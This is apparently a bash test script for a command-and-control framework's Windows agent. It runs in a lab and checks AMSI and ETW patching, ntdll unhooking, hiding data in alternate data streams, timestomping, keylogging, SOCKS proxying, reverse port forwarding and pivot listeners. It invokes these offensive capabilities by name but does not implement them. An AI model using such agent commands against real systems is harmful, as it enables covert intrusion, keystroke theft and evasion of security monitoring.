#!/usr/bin/env bash
# tests/docker/scripts/test_08_windows.sh — Windows agent feature tests
#
# Exercises Windows-specific agent capabilities via the C2 API.
# Only runs when WINDOWS_AGENT=1 (set by docker-compose.windows.yml).
#
# On Linux hosts this test skips cleanly. On Windows hosts with the
# --profile windows compose overlay, it validates: evasion primitives,
# file/ADS/timestomp operations, process injection, SOCKS proxying,
# reverse port forwarding, pivot listeners, keylogging, job system,
# beacon modes, and sleep configuration.
source "$(dirname "$0")/lib.sh"

if [ "${WINDOWS_AGENT:-0}" != "1" ]; then
    skip "Windows agent not enabled (set WINDOWS_AGENT=1)"
    print_summary
    exit 0
fi

# ════════════════════════════════════════════════════════════════════════
# §1  Agent Check-In
# ════════════════════════════════════════════════════════════════════════

suite "Windows agent has checked in"
HOSTS=$(api_get "/api/hosts")
assert_http "hosts list returns 200" "200"

WIN_SESSION=$(echo "$HOSTS" | jq -r '[.[] | select(.hostname=="agent-windows")][0].id // empty')
if [ -z "$WIN_SESSION" ]; then
    skip "Windows agent session not found — is agent-windows running?"
    print_summary
    exit 0
fi
echo "  ✓ Windows agent session: #${WIN_SESSION}"
PASS_COUNT=$((PASS_COUNT + 1))

WIN_OS=$(echo "$HOSTS" | jq -r --arg id "$WIN_SESSION" '[.[] | select(.id==($id|tonumber))][0].os // empty')
assert_eq "agent reports windows OS" "windows" "$WIN_OS"

# ── Helpers ─────────────────────────────────────────────────────────────

win_cmd() {
    local cmd="$1"
    local resp
    resp=$(api_post "/api/hosts/${WIN_SESSION}/command" "$ADMIN_KEY" "{\"command\":\"${cmd}\"}")
    echo "$resp" | jq -r '.request_id // empty'
}

win_output() {
    local req_id="$1" timeout="${2:-10}"
    local attempts=$((timeout * 2))
    for i in $(seq 1 "$attempts"); do
        local out
        out=$(api_get "/api/hosts/${WIN_SESSION}/output/${req_id}")
        local val
        val=$(echo "$out" | jq -r '.output // empty')
        if [ -n "$val" ]; then
            echo "$out"
            return 0
        fi
        sleep 0.5
    done
    echo "{}"
    return 1
}

# Send command, wait for output, return .output field
win_exec() {
    local cmd="$1" timeout="${2:-10}"
    local rid
    rid=$(win_cmd "$cmd")
    if [ -z "$rid" ]; then echo ""; return 1; fi
    local out
    out=$(win_output "$rid" "$timeout")
    echo "$out" | jq -r '.output // empty'
}

# Send command, wait for output, return .error field
win_err() {
    local cmd="$1" timeout="${2:-10}"
    local rid
    rid=$(win_cmd "$cmd")
    if [ -z "$rid" ]; then echo ""; return 1; fi
    local out
    out=$(win_output "$rid" "$timeout")
    echo "$out" | jq -r '.error // empty'
}

# ════════════════════════════════════════════════════════════════════════
# §2  Shell Execution
# ════════════════════════════════════════════════════════════════════════

suite "Windows shell command execution"
WHOAMI=$(win_exec "shell whoami")
assert_ne "whoami returns output" "" "$WHOAMI"

suite "Windows OS identification"
OS_INFO=$(win_exec "shell systeminfo | findstr /C:\"OS Name\"" 20)
assert_contains "output contains Windows" "Windows" "$OS_INFO"

suite "Shell shorthand (! prefix)"
HOSTNAME_OUT=$(win_exec "!hostname")
assert_ne "!hostname returns output" "" "$HOSTNAME_OUT"

suite "Unknown command is rejected (not passed to shell)"
ERR=$(win_err "notarealcommand")
assert_contains "error mentions unknown command" "Unknown command" "$ERR"

# ════════════════════════════════════════════════════════════════════════
# §3  Evasion Primitives
# ════════════════════════════════════════════════════════════════════════

suite "Evasion: AMSI patch"
AMSI=$(win_exec "evasion:patch_amsi")
assert_ne "AMSI patch returns result" "" "$AMSI"

suite "Evasion: ETW patch"
ETW=$(win_exec "evasion:patch_etw")
assert_ne "ETW patch returns result" "" "$ETW"

suite "Evasion: ntdll unhook"
UNHOOK=$(win_exec "evasion:unhook_ntdll")
assert_ne "ntdll unhook returns result" "" "$UNHOOK"

suite "Evasion: patch_all (combined)"
PALL=$(win_exec "evasion:patch_all")
assert_ne "patch_all returns result" "" "$PALL"

suite "Evasion: syscall number resolution"
SYSCALL=$(win_exec "evasion:syscall_check")
assert_contains "resolves NtAllocateVirtualMemory" "NtAllocateVirtualMemory" "$SYSCALL"
assert_contains "resolves NtCreateThreadEx" "NtCreateThreadEx" "$SYSCALL"

# ════════════════════════════════════════════════════════════════════════
# §4  File Operations
# ════════════════════════════════════════════════════════════════════════

B64_CONTENT=$(echo -n "RCM_WIN_TEST_PAYLOAD" | base64)
TEST_PATH='C:\\Windows\\Temp\\rcm_win_test.txt'

suite "File write"
WRITE=$(win_exec "file:write|${TEST_PATH}|${B64_CONTENT}")
assert_contains "write confirmed" "File written" "$WRITE"

suite "File read"
READ=$(win_exec "file:read|${TEST_PATH}")
assert_contains "read returns file:data marker" "file:data" "$READ"

suite "Directory listing"
LS=$(win_exec "fs:ls C:\\Windows\\Temp")
assert_ne "directory listing non-empty" "" "$LS"

suite "Secure delete"
SDEL=$(win_exec "secure_delete ${TEST_PATH}")
assert_ne "secure delete returns result" "" "$SDEL"

# ════════════════════════════════════════════════════════════════════════
# §5  NTFS Alternate Data Streams
# ════════════════════════════════════════════════════════════════════════

ADS_PATH='C:\\Windows\\Temp\\rcm_ads_test.txt'
ADS_B64=$(echo -n "ADS_HIDDEN_DATA" | base64)

suite "ADS: create host file"
win_exec "file:write|${ADS_PATH}|$(echo -n 'host_file' | base64)" > /dev/null

suite "ADS: write stream"
ADS_W=$(win_exec "ads:write ${ADS_PATH} secret_stream ${ADS_B64}")
assert_ne "ADS write returns result" "" "$ADS_W"

suite "ADS: list streams"
ADS_L=$(win_exec "ads:list ${ADS_PATH}")
assert_contains "stream name listed" "secret_stream" "$ADS_L"

suite "ADS: read stream"
ADS_R=$(win_exec "ads:read ${ADS_PATH} secret_stream")
assert_ne "ADS read returns data" "" "$ADS_R"

suite "ADS: cleanup"
win_exec "secure_delete ${ADS_PATH}" > /dev/null

# ════════════════════════════════════════════════════════════════════════
# §6  Timestomping
# ════════════════════════════════════════════════════════════════════════

STOMP_PATH='C:\\Windows\\Temp\\rcm_stomp_test.txt'

suite "Timestomp: create test file"
win_exec "file:write|${STOMP_PATH}|$(echo -n 'stomp_test' | base64)" > /dev/null

suite "Timestomp: set epoch"
STOMP=$(win_exec "timestomp:set ${STOMP_PATH} 1000000000")
assert_ne "timestomp set returns result" "" "$STOMP"

suite "Timestomp: copy from reference"
STOMP2=$(win_exec "timestomp ${STOMP_PATH} C:\\Windows\\System32\\kernel32.dll")
assert_ne "timestomp copy returns result" "" "$STOMP2"

suite "Timestomp: cleanup"
win_exec "secure_delete ${STOMP_PATH}" > /dev/null

# ════════════════════════════════════════════════════════════════════════
# §7  Job System
# ════════════════════════════════════════════════════════════════════════

suite "Background job: start"
BG=$(win_exec "bg shell dir C:\\Windows\\System32\\drivers")
assert_contains "job started" "Job" "$BG"

suite "Background job: list"
sleep 2
JOBS=$(win_exec "jobs:list")
assert_ne "jobs list non-empty" "" "$JOBS"

suite "Background job: purge"
PURGE=$(win_exec "jobs:purge")
assert_contains "purge reports count" "Purged" "$PURGE"

# ════════════════════════════════════════════════════════════════════════
# §8  Beacon Mode & Sleep Config
# ════════════════════════════════════════════════════════════════════════

suite "Beacon: activate fast mode"
ACTIVE=$(win_exec "beacon:mode active")
assert_contains "fast mode confirmed" "Activated" "$ACTIVE"

suite "Beacon: return to passive"
PASSIVE=$(win_exec "beacon:mode passive")
assert_contains "passive mode confirmed" "Deactivated" "$PASSIVE"

suite "Sleep: update interval"
SLEEP_CFG=$(win_exec "sleep 5 10 20")
assert_contains "sleep updated" "Configuration Updated" "$SLEEP_CFG"

suite "Sleep: restore fast polling"
win_exec "sleep 2 0 0" > /dev/null

# ════════════════════════════════════════════════════════════════════════
# §9  Fallback Configuration
# ════════════════════════════════════════════════════════════════════════

suite "Fallback: show config"
FB=$(win_exec "fallback:config")
assert_ne "fallback config non-empty" "" "$FB"

# ════════════════════════════════════════════════════════════════════════
# §10  Keylogger Lifecycle
# ════════════════════════════════════════════════════════════════════════

suite "Keylogger: start"
KL_START=$(win_exec "keylogger:start")
assert_ne "keylogger start returns result" "" "$KL_START"

suite "Keylogger: dump (may be empty buffer)"
sleep 1
KL_DUMP=$(win_exec "keylogger:dump")
assert_ne "keylogger dump returns result" "" "$KL_DUMP"

suite "Keylogger: stop"
KL_STOP=$(win_exec "keylogger:stop")
assert_ne "keylogger stop returns result" "" "$KL_STOP"

# ════════════════════════════════════════════════════════════════════════
# §11  SOCKS Proxy (Forward)
# ════════════════════════════════════════════════════════════════════════

suite "SOCKS proxy: start"
PROXY_RESP=$(api_post "/api/hosts/${WIN_SESSION}/proxy")
assert_http "proxy start returns 200" "200"
SOCKS_PORT=$(echo "$PROXY_RESP" | jq -r '.socks_port // empty')
assert_ne "socks port assigned" "" "$SOCKS_PORT"
echo "  (socks_port=$SOCKS_PORT)"

suite "SOCKS proxy: appears in list"
PLIST=$(api_get "/api/proxies")
assert_http "proxy list returns 200" "200"
WIN_PROXY=$(echo "$PLIST" | jq --argjson sid "$WIN_SESSION" '[.[] | select(.session_id==$sid)] | length')
assert_ne "proxy for windows session exists" "0" "$WIN_PROXY"

suite "SOCKS proxy: stop"
api_delete "/api/hosts/${WIN_SESSION}/proxy"
assert_http "proxy stop returns 200" "200"

suite "SOCKS proxy: removed from list"
PLIST2=$(api_get "/api/proxies")
WIN_PROXY2=$(echo "$PLIST2" | jq --argjson sid "$WIN_SESSION" '[.[] | select(.session_id==$sid)] | length')
assert_eq "proxy cleaned up" "0" "$WIN_PROXY2"

# ════════════════════════════════════════════════════════════════════════
# §12  Reverse Port Forwarding
# ════════════════════════════════════════════════════════════════════════

suite "Rportfwd: start (tunnel to mock-service)"
RFWD_RESP=$(api_post "/api/hosts/${WIN_SESSION}/rportfwd" "$ADMIN_KEY" \
    '{"bind_port":19080,"target_host":"mock-service","target_port":80}')
assert_http "rportfwd start returns 200" "200"

suite "Rportfwd: appears in list"
RLIST=$(api_get "/api/rportfwds")
assert_http "rportfwd list returns 200" "200"
RFWD_COUNT=$(echo "$RLIST" | jq 'length')
assert_ne "rportfwd list not empty" "0" "$RFWD_COUNT"

suite "Rportfwd: traffic tunnels to mock-service"
sleep 3
MOCK_RESP=$(curl -sf --max-time 5 http://c2-server:19080/ 2>/dev/null || echo "CONNECT_FAILED")
if echo "$MOCK_RESP" | grep -qF "MOCK_SERVICE_OK"; then
    echo "  ✓ rportfwd delivers mock-service content"
    PASS_COUNT=$((PASS_COUNT + 1))
elif echo "$MOCK_RESP" | grep -qF "CONNECT_FAILED"; then
    echo "  ✗ rportfwd connection failed (tunnel may not be established yet)"
    FAIL_COUNT=$((FAIL_COUNT + 1))
else
    echo "  ✗ unexpected response: $(echo "$MOCK_RESP" | head -1)"
    FAIL_COUNT=$((FAIL_COUNT + 1))
fi

suite "Rportfwd: stop"
api_delete "/api/hosts/${WIN_SESSION}/rportfwd" "$ADMIN_KEY" '{"bind_port":19080}'
assert_http "rportfwd stop returns 200" "200"

suite "Rportfwd: removed from list after stop"
sleep 1
RLIST2=$(api_get "/api/rportfwds")
RFWD_WIN=$(echo "$RLIST2" | jq --argjson sid "$WIN_SESSION" '[.[] | select(.session_id==$sid)] | length')
assert_eq "rportfwd cleaned up" "0" "$RFWD_WIN"

# ════════════════════════════════════════════════════════════════════════
# §13  Pivot Listeners
# ════════════════════════════════════════════════════════════════════════

suite "Pivot: start TCP listener on agent"
PIVOT_TCP=$(win_exec "pivot:listener_tcp 14443")
assert_ne "TCP pivot returns result" "" "$PIVOT_TCP"

suite "Pivot: start SMB named pipe listener on agent"
PIVOT_SMB=$(win_exec "pivot:listener_smb rcm_test_pipe")
assert_ne "SMB pivot returns result" "" "$PIVOT_SMB"

# ════════════════════════════════════════════════════════════════════════
# §14  Session History
# ════════════════════════════════════════════════════════════════════════

suite "Session history contains Windows commands"
sleep 2
HIST=$(api_get "/api/hosts/${WIN_SESSION}/history")
assert_http "history returns 200" "200"
assert_contains "history has whoami" "whoami" "$HIST"

suite "Global history includes Windows session"
GHIST=$(api_get "/api/history")
assert_http "global history returns 200" "200"

# ════════════════════════════════════════════════════════════════════════
# §15  RBAC on Windows Session
# ════════════════════════════════════════════════════════════════════════

suite "Viewer cannot command Windows agent"
VW_KEY=$(login_as "testview" "$VIEWER_PASS")
if [ -n "$VW_KEY" ]; then
    api_post "/api/hosts/${WIN_SESSION}/command" "$VW_KEY" '{"command":"shell whoami"}'
    assert_http "viewer blocked from Windows commands" "403"
else
    skip "viewer login failed"
fi

suite "Viewer cannot start proxy on Windows agent"
if [ -n "$VW_KEY" ]; then
    api_post "/api/hosts/${WIN_SESSION}/proxy" "$VW_KEY"
    assert_http "viewer blocked from Windows proxy" "403"
else
    skip "viewer login failed"
fi

suite "Operator can command Windows agent"
OP_KEY=$(login_as "testop" "$OPERATOR_PASS")
if [ -n "$OP_KEY" ]; then
    api_post "/api/hosts/${WIN_SESSION}/command" "$OP_KEY" '{"command":"shell echo OP_TEST"}'
    assert_http "operator can command Windows agent" "200"
else
    skip "operator login failed"
fi

print_summary
